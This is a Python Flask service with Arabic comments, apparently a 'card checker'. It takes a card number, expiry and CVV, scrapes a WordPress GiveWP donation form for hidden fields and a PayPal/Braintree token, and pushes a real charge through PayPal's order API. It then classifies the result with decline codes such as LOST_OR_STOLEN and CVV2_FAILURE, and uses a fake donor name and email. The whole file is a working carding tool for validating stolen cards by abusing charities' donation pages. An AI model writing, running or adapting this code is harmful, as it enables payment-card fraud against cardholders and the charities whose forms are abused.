from flask import Flask, request
import requests
import re
import base64
import json
import logging
import os  # <--- تمت الإضافة
from urllib.parse import urlparse

app = Flask(__name__)

# إعداد التسجيل (logging) لتتبع الأخطاء
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def get_base_url(full_url):
    parsed = urlparse(full_url)
    return f"{parsed.scheme}://{parsed.netloc}"

def extract_hidden_inputs(html):
    """استخراج جميع الحقول المخفية من HTML"""
    inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', html, re.IGNORECASE)
    hidden = {}
    for inp in inputs:
        name_match = re.search(r'name=["\']([^"\']+)["\']', inp)
        value_match = re.search(r'value=["\']([^"\']*)["\']', inp)
        if name_match:
            name = name_match.group(1)
            value = value_match.group(1) if value_match else ''
            hidden[name] = value
    return hidden

def extract_script_vars(html):
    """محاولة استخراج المتغيرات من كود JavaScript (مثل give_global_vars)"""
    # البحث عن give_global_vars
    give_vars_match = re.search(r'var\s+give_global_vars\s*=\s*(\{.*?\});', html, re.DOTALL)
    if give_vars_match:
        try:
            vars_json = give_vars_match.group(1)
            # قد تحتوي على تعليقات أو أحرف غير صالحة، نحاول تنظيفها
            vars_json = re.sub(r'//.*?\n', '', vars_json)  # إزالة التعليقات
            vars_json = re.sub(r',\s*}', '}', vars_json)   # إزالة الفاصلة الزائدة قبل الإغلاق
            return json.loads(vars_json)
        except:
            pass
    return {}

def pali(ccx, site_url, amount):
    try:
        ccx = ccx.strip()
        parts = ccx.split('|')
        if len(parts) < 4:
            return "Invalid card format"
        n = parts[0]
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvc = parts[3].strip()
        if len(yy) == 4 and yy.startswith('20'):
            yy = yy[2:]
        elif len(yy) != 2:
            return "Invalid year"

        base = get_base_url(site_url)
        ajax_url = f"{base}/wp-admin/admin-ajax.php"

        r = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.google.com/',
        }

        # الطلب الأول للموقع
        logger.info(f"Fetching site: {site_url}")
        response1 = r.get(site_url, headers=headers, timeout=15)
        html = response1.text

        # استخراج الحقول المخفية
        hidden_fields = extract_hidden_inputs(html)
        logger.info(f"Hidden fields found: {list(hidden_fields.keys())}")

        # استخراج المتغيرات من JavaScript
        script_vars = extract_script_vars(html)
        logger.info(f"Script vars keys: {list(script_vars.keys()) if script_vars else 'None'}")

        # الحقول الأساسية المطلوبة
        required = ['give-form-hash', 'give-form-id', 'give-form-id-prefix']
        for field in required:
            if field not in hidden_fields:
                error_msg = f"Missing required field '{field}' in the form. Available fields: {list(hidden_fields.keys())}"
                logger.error(error_msg)
                return error_msg

        hash_val = hidden_fields['give-form-hash']
        iid = hidden_fields['give-form-id']
        prefix = hidden_fields['give-form-id-prefix']

        # استخراج token - قد يكون في script vars أو في HTML
        token_match = re.search(r'"data-client-token":"(.*?)"', html)
        if not token_match:
            token_match = re.search(r"'data-client-token':' (.*?)'", html)
        if not token_match and script_vars:
            token_match = script_vars.get('data-client-token')
        if not token_match:
            error_msg = "Could not find data-client-token in the page"
            logger.error(error_msg)
            return error_msg

        lol = token_match if isinstance(token_match, str) else token_match.group(1)
        try:
            kol = base64.b64decode(lol).decode('utf-8')
            la = re.findall(r'"accessToken":"(.*?)"', kol)[0]
        except Exception as e:
            logger.error(f"Failed to decode token: {e}")
            return f"ERROR decoding token: {e}"

        # استخراج عنوان الصفحة
        title_match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        form_title = title_match.group(1) if title_match else "Donation Form"

        # إعداد بيانات الطلب الأساسية
        data = {
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, prefix),
            'give-form-id': (None, iid),
            'give-form-title': (None, form_title),
            'give-current-url': (None, site_url),
            'give-form-url': (None, site_url),
            'give-form-hash': (None, hash_val),
            'give-amount': (None, amount),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'Jana'),
            'give_last': (None, 'Qhmed'),
            'give_email': (None, 'kotomoto237@yahoo.com'),
            'card_name': (None, 'Kane caroen'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        }

        # دمج الحقول المخفية الأخرى (مع استبعاد الحقول المكررة)
        exclude = set(data.keys()) | {'give-form-hash', 'give-form-id', 'give-form-id-prefix', 'give-amount'}
        for key, value in hidden_fields.items():
            if key not in exclude:
                data[key] = (None, value)

        # إضافة قيم افتراضية مستوحاة من Botpaypal3.py إذا لم تكن موجودة
        defaults = {
            'give-price-id': '0',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-recurring-period-donors-choice': 'month',
            'give-form-minimum': amount,
            'give-form-maximum': '1000000.00',
            'give-fee-amount': '0.7',
            'give-fee-mode-enable': 'false',
            'give-fee-status': 'enabled',
            'give-fee-recovery-settings': '{"fee_data":{"paypal-commerce":{"percentage":"1.990000","base_amount":"0.490000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"},"offline":{"percentage":"0.000000","base_amount":"0.000000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"}},"give_fee_status":true,"give_fee_disable":false,"is_break_down":true,"fee_mode":"donor_opt_in","is_fee_mode":true,"fee_recovery":true}'
        }
        for key, value in defaults.items():
            if key not in data:
                data[key] = (None, value)

        # الطلب الثاني: إنشاء الطلب (create order)
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US',
            'Origin': base,
            'Referer': site_url,
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
        }
        params = {'action': 'give_paypal_commerce_create_order'}
        logger.info("Sending create order request")
        response2 = r.post(ajax_url, params=params, headers=headers, data=data, timeout=15)

        if response2.status_code != 200:
            logger.error(f"Create order failed with status {response2.status_code}: {response2.text[:200]}")
            return f"ERROR: Create order failed with status {response2.status_code}"

        try:
            joker = response2.json()['data']['id']
        except (KeyError, json.JSONDecodeError) as e:
            logger.error(f"Failed to parse create order response: {response2.text[:500]}")
            return f"ERROR: Invalid response from create order: {response2.text[:200]}"

        # الطلب الثالث: تأكيد مصدر الدفع
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US',
            'Authorization': f'Bearer {la}',
            'Content-Type': 'application/json',
            'Origin': 'https://assets.braintreegateway.com',
            'Referer': 'https://assets.braintreegateway.com/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                },
            },
            'application_context': {'vault': False},
        }
        confirm_url = f'https://cors.api.paypal.com/v2/checkout/orders/{joker}/confirm-payment-source'
        response3 = r.post(confirm_url, headers=headers, json=json_data, timeout=15)
        if response3.status_code != 200:
            logger.error(f"Confirm payment source failed: {response3.text[:200]}")
            # نستمر رغم الخطأ، بعض المواقع لا تحتاج هذه الخطوة

        # الطلب الرابع: الموافقة على الطلب
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US',
            'Origin': base,
            'Referer': site_url,
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
        }
        params = {'action': 'give_paypal_commerce_approve_order', 'order': joker}
        response4 = r.post(ajax_url, params=params, headers=headers, data=data, timeout=15)

        if response4.status_code != 200:
            logger.error(f"Approve order failed with status {response4.status_code}: {response4.text[:200]}")
            return f"ERROR: Approve order failed with status {response4.status_code}"

        text = response4.text
        logger.info(f"Final response: {text[:200]}")

        # قائمة الردود الكاملة (كما في Botpaypal3.py)
        if 'true' in text or 'sucsess' in text:
            return f'CHARGE {amount}$'
        elif 'DO_NOT_HONOR' in text:
            return "DO_NOT_HONOR"
        elif 'ACCOUNT_CLOSED' in text:
            return "ACCOUNT_CLOSED"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
        elif 'LOST_OR_STOLEN' in text:
            return "LOST_OR_STOLEN"
        elif 'CVV2_FAILURE' in text:
            return "CVV2_FAILURE"
        elif 'SUSPECTED_FRAUD' in text:
            return "SUSPECTED_FRAUD"
        elif 'INVALID_ACCOUNT' in text:
            return "INVALID_ACCOUNT"
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return "REATTEMPT_NOT_PERMITTED"
        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
            return "ACCOUNT_BLOCKED_BY_ISSUER"
        elif 'ORDER_NOT_APPROVED' in text:
            return "ORDER_NOT_APPROVED"
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return "PICKUP_CARD_SPECIAL_CONDITIONS"
        elif 'PAYER_CANNOT_PAY' in text:
            return "PAYER_CANNOT_PAY"
        elif 'INSUFFICIENT_FUNDS' in text:
            return "INSUFFICIENT_FUNDS"
        elif 'GENERIC_DECLINE' in text:
            return "GENERIC_DECLINE"
        elif 'COMPLIANCE_VIOLATION' in text:
            return "COMPLIANCE_VIOLATION"
        elif 'TRANSACTION_NOT_PERMITTED' in text:
            return "TRANSACTION_NOT_PERMITTED"
        elif 'PAYMENT_DENIED' in text:
            return "PAYMENT_DENIED"
        elif 'INVALID_TRANSACTION' in text:
            return "INVALID_TRANSACTION"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return "RESTRICTED_OR_INACTIVE_ACCOUNT"
        elif 'SECURITY_VIOLATION' in text:
            return "SECURITY_VIOLATION"
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return "INVALID_OR_RESTRICTED_CARD"
        elif 'EXPIRED_CARD' in text:
            return "EXPIRED_CARD"
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return "CRYPTOGRAPHIC_FAILURE"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return "TRANSACTION_CANNOT_BE_COMPLETED"
        elif 'DECLINED_PLEASE_RETRY' in text:
            return "DECLINED_PLEASE_RETRY_LATER"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return "TX_ATTEMPTS_EXCEED_LIMIT"
        else:
            try:
                error_data = response4.json()
                if 'data' in error_data and 'error' in error_data['data']:
                    return error_data['data']['error']
                elif 'message' in error_data:
                    return error_data['message']
                else:
                    return str(error_data)
            except:
                return text if text else "UNKNOWN_ERROR"
    except Exception as e:
        logger.exception("Unhandled exception in pali")
        return f"ERROR: {str(e)}"

@app.route('/paypal', methods=['GET'])
def paypal_endpoint():
    cc = request.args.get('cc')
    url = request.args.get('url')
    price = request.args.get('price')
    if not cc or not url or not price:
        return "Missing parameters", 400
    result = pali(cc, url, price)
    return result

if __name__ == '__main__':
    # استخدام المنفذ من متغير البيئة PORT (مهم لـ Railway)
    port = int(os.environ.get('PORT', 5500))
    app.run(host='0.0.0.0', port=port, debug=False)
